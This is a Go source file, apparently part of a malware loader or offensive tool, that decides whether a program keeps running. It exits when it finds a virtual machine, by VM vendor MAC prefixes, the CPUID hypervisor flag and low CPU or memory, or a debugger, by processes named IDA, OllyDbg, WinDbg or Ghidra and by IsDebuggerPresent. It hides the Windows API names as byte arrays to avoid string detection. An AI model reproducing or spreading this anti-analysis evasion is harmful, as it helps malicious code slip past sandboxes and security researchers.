package detect

import (
	"net"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"github.com/klauspost/cpuid"
)

func ContinueRun() bool {
	if checkNic() || checkResource() {
		println("VM detected, exit")
		return false
	}

	if detectDBG() {
		println("Have a good day")
		return false
	}

	return true
}

// Modified from https://github.com/ShellCode33/VM-Detection
var blacklistedMacAddressPrefixes = []string{
	"00:1C:42", // Parallels
	"08:00:27", // VirtualBox
	"00:05:69", // |
	"00:0C:29", // | > VMWare
	"00:1C:14", // |
	"00:50:56", // |
	"00:16:E3", // Xen
}

func checkNic() bool {
	interfaces, err := net.Interfaces()
	if err != nil {
		return false
	}

	for _, iface := range interfaces {
		macAddr := iface.HardwareAddr.String()
		if strings.HasPrefix(iface.Name, "Ethernet") ||
			strings.HasPrefix(iface.Name, "以太网") ||
			strings.HasPrefix(iface.Name, "本地连接") {
			if macAddr != "" {
				for _, prefix := range blacklistedMacAddressPrefixes {
					if strings.HasPrefix(macAddr, prefix) {
						return true
					}
				}
			}
		}
	}

	return false
}

type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

func checkResource() bool {
	if cpuid.CPU.VM() {
		return true
	}

	memStatus := memoryStatusEx{}
	memStatus.dwLength = (uint32)(unsafe.Sizeof(memStatus))

	if ret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x',
	})).Call((uintptr)(unsafe.Pointer(&memStatus))); ret == 0 {
		return false
	}

	if runtime.NumCPU() < 2 || memStatus.ullTotalPhys < 1<<31 {
		return true
	}

	return false
}

var blacklistDBG = []string{
	"IDA",
	"OLLY",
	"WINDBG",
	"GHIDRA",
}

const MAX_PATH = 260

func detectDBG() bool {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}

	pe32 := syscall.ProcessEntry32{}
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(handle, &pe32)

	for err == nil {
		exeFile := strings.ToUpper(syscall.UTF16ToString(pe32.ExeFile[:MAX_PATH]))
		for _, pn := range blacklistDBG {
			if strings.Contains(exeFile, pn) {
				return true
			}
		}
		err = syscall.Process32Next(handle, &pe32)
	}

	if ret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'I', 's', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't',
	})).Call(); ret != 0 {
		return true
	}

	return false
}
